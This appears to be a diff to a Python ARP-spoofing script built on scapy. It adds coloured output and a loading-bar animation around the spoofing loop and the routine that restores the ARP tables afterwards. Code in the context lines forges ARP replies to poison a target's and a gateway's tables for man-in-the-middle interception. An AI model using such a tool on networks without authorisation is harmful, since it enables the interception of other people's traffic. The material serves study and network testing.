@@ -10,6 +10,8 @@ ANSI escape codes:
     Green: \033[92m
     Yellow: \033[93m
     Clear: \033[0m
+    Cyan Background: \033[48;5;51m
+    Black Foreground: \033[38;5;0m
 ---------------------------------
 Error Codes:
     0: No error
@@ -124,6 +126,8 @@ def restore(destinationIP, sourceIP):
     packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
     scapy.send(packet, count=4, verbose=False)
 
+# Loading animation
+loading = lambda i: print(f"\r|\033[48;5;51;38;5;0m{'>' * (i * 25 // 100)}\033[0m{' ' * (25 - (i * 25 // 100))}|", end="") or time.sleep(0.01)
 
 def main():
     """
@@ -138,6 +142,8 @@ def main():
     targetMAC = getMAC(targetIP)
     gatewayMAC = getMAC(gatewayIP)
     try:
+        print("\033[92m[+] ARP spoofing starting. Press CTRL + C to stop.\033[0m")
+        list(map(loading, range(101)))
         while True:
             if macResetTimer == 600:
                 targetMAC = getMAC(targetIP)
@@ -153,6 +159,7 @@ def main():
         print("\n\033[93m[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\033[0m")
         restore(targetIP, gatewayIP)
         restore(gatewayIP, targetIP)
+        list(map(loading, range(101)))
         # os.system("service apache2 stop")    # Uncomment this line if you started the apache2 service at the beginning of the script
         print("\033[92m[+] ARP tables restored. Quitting.\033[0m")
         sys.exit(0)
